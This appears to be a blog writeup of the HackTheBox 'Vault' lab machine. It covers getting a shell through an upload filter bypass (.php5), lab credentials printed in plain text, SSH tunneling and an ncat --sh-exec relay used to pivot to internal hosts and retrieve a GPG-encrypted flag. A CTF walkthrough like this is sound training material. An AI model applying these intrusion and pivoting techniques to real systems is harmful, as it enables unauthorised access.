---
layout: post
title:  "HTB Vault Machine Writeup"
date:   2020-1-2 00:10:00 +0000
categories: hackthebox
---
Vault is easily one of my favourite boxes on hackthebox. It taught me a lot about tunneling and moving through a network any way possible. This is one of the boxes i got truely stuck into for days and could not stop thinking about what the next move was.

# Initial Nmap scan
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a6:9d:0f:7d:73:75:bb:a8:94:0a:b7:e3:fe:1f:24:f4 (RSA)
|   256 2c:7c:34:eb:3a:eb:04:03:ac:48:28:54:09:74:3d:27 (ECDSA)
|_  256 98:42:5f:ad:87:22:92:6d:72:e6:66:6c:82:c1:09:83 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
No exact OS matches for host
```

# First webapp
The initial webapp doesnt give too much away but what it does say is enough. 
```
Welcome to the Slowdaddy web interface
We specialise in providing financial orginisations with strong web and database solutions and we promise to keep your customers financial data safe.
We are proud to announce our first client: Sparklays (Sparklays.com still under construction) 
```

We can infer from this that 'sparklays' will be a directory, we can add this to our directory bruteforcer to find the relevant files.
/sparklays/admin.php - login prompt
/sparklays/login.php - 'access denied'
/sparklays/design/uploads - file upload

# Landing a shell
Testing some file uploads, its clear we cant upload anything with a .php extension, .php5 however, works just fine. Navigating to the page with our file executes and we get our meterpreter session.
The directory listing on the server is as follows:
```
home/alex
home/dave
	servers.txt;
		DNS + Configurator - 192.168.122.4
		Firewall - 192.168.122.5
		The Vault - x
	key.txt;
		itscominghome
	ssh.txt;
		Dav3therav3123
```
# Second webapp
We now have ssh creds for dave. We can now tunnel to access that page we couldnt reach before.
```
ssh -L 8888:192.168.122.4:80 dave@10.10.10.109
```
This page looks to be a testing page for a vpn config. Theres also a /notes directory which contains the following
```
chmod 123.ovpn and script.sh to 777
```

I found this handy guide on the best way to exploit this vpn testing page for code execution (link)

We can use nc as a listener on daves system because where in the dns. Now we land as root @ dns and we can get the user flag.

Theres a new ssh file in the dave directory on the dns now. 
```
theres also a ‘ssh’ file in the dave dir
root@DNS:/home/dave# cat ssh
cat ssh
dave
dav3gerous567
```

Looks like a password or something but doesnt work on the initial site. We will have to keep it for later.




# breakpoint 1
At this point, what do we know.
- We are root@dns when we want
- We know there is an alex user
- We have unused passwords;
	- itscominghome
	- dav3gerous567
- We have the address of vault - 192.168.5.2

# Getting to the end

Checking /var/log/auth.log we get an interesting result.
```
root : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/ncat -l 1235 --sh-exec ncat 192.168.5.2 987 -p 53
```

From this we get an idea of what we have to do. We have to use netcat to inject another netcat for us to connect to.

```
sudo ncat -l 1234 --sh-exec "ncat 192.168.5.2 987 -p 53" &
use the ampersand to background it
ssh dave@192.168.122.4 -p 1234
    
we get in
    
dave@vault:~$ ls
root.txt.gpg
```

We have our root flag right here but we cant decrypt yet.
We will have to move it from vault > dns > ubuntu.

# Root flag
oh jeez, weve come this far, and now we need to go back.
We have a GPG encrypted file (root flag) but the key is on the first system, since gpg works the way it works, we have to move it to that first system where the key is.
I chose to move the file with scp but in hindsight there was probably a better way of doing this.
```
dave@DNS:/tmp$ scp -P 1331 dave@192.168.122.4:/home/dave/root.txt.gpg /tmp
The authenticity of host '[192.168.122.4]:1331 ([192.168.122.4]:1331)' can't be established.
ECDSA key fingerprint is SHA256:Wo70Zou+Hq5m/+G2vuKwUnJQ4Rwbzlqhq2e1JBdjEsg.
Are you sure you want to continue connecting (yes/no)? yse
Please type 'yes' or 'no': yes
Warning: Permanently added '[192.168.122.4]:1331' (ECDSA) to the list of known hosts.
dave@192.168.122.4's password: 
root.txt.gpg                                                                                                                                      100%  629     0.6KB/s   00:00    
[1]+  Done                    sudo ncat -l 1331 --sh-exec "ncat 192.168.5.2 987 -p 4444"

dave@ubuntu:~$ scp dave@192.168.122.4:/tmp/root.txt.gpg .
dave@192.168.122.4's password: 
root.txt.gpg                                                                                                                                      100%  629     0.6KB/s   00:00    
dave@ubuntu:~$ gpg -d root.txt.gpg

You need a passphrase to unlock the secret key for
user: "david <dave@david.com>"
4096-bit RSA key, ID D1EB1F03, created 2018-07-24 (main key ID 0FDFBFE4)

gpg: encrypted with 4096-bit RSA key, ID D1EB1F03, created 2018-07-24
      "david <dave@david.com>"
<flag redacted>
```
Once back on the first system and decoding the flag, gpg asks for a password and weve had it all this time
Decrypting with the key gives us our flag to submit.





